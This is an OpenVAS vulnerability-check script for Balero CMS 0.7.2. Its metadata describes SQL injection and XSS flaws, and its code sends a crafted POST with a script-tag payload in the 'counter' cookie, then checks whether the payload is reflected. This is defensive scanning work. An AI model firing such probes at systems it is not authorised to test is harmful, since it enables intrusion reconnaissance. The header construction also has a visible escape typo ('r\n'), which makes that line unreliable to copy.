if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.805365" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2015-04-09 13:05:47 +0530 (Thu, 09 Apr 2015)" );
	script_name( "Balero CMS Multiple Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/36675" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/36676" );
	script_xref( name: "URL", value: "http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5239.php" );
	script_tag( name: "summary", value: "The host is installed with Balero CMS
  and is prone to multiple vulnerabilities." );
	script_tag( name: "vuldetect", value: "Send a crafted request via HTTP
  GET and check whether it is able to read cookie or not." );
	script_tag( name: "insight", value: "Multiple flaws are due to input
  passed via,

  - 'content' parameter to 'mod-blog' is not properly validated.

  - 'counter' parameter to 'admin' is not properly validated.

  - 'pages' and 'themes' parameter to 'admin' is not properly validated.

  - 'a' and 'virtual_title' parameter to 'mod-virtual_page' is not properly validated.

  - 'id' and 'title' parameter to 'mod-blog' is not properly validated.

  - 'code' parameter to 'mod-languages' is not properly validated." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote
  attackers to inject or manipulate SQL queries in the back-end database and execute
  arbitrary HTML and script code in a users browser session in the context of an
  affected site." );
	script_tag( name: "affected", value: "Balero CMS version 0.7.2, Prior
  versions may also be affected." );
	script_tag( name: "solution", value: "Update to Balero CMS 0.8.3 or later." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_xref( name: "URL", value: "http://www.balerocms.com" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
host = http_host_name( port: port );
useragent = http_get_user_agent();
for dir in nasl_make_list_unique( "/", "/balerocms", "/cms", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	rcvRes = http_get_cache( item: dir + "/", port: port );
	if(ContainsString( rcvRes, ">Balero CMS<" )){
		url = dir + "/admin";
		cookie = "<script>alert(\"XSS\")</script>";
		postdata = NASLString( "usr=aqsd&pwd=asd&login=Log+In\\r\\n" );
		sndReq = NASLString( "POST ", url, " HTTP/1.1\r\n", "Host: ", host, "\r\n", "User-Agent: ", useragent, "r\n", "Referer: http://", host, url, "\r\n", "Cookie: counter=", cookie, "\r\n", "Content-Type: application/x-www-form-urlencoded\r\n", "Content-Length: ", strlen( postdata ), "\r\n\r\n", postdata );
		rcvRes = http_keepalive_send_recv( port: port, data: sndReq );
		if(IsMatchRegexp( rcvRes, "^HTTP/1\\.[01] 200" ) && ContainsString( rcvRes, "alert(\"XSS\")" ) && rcvRes && ContainsString( rcvRes, ">Login<" )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

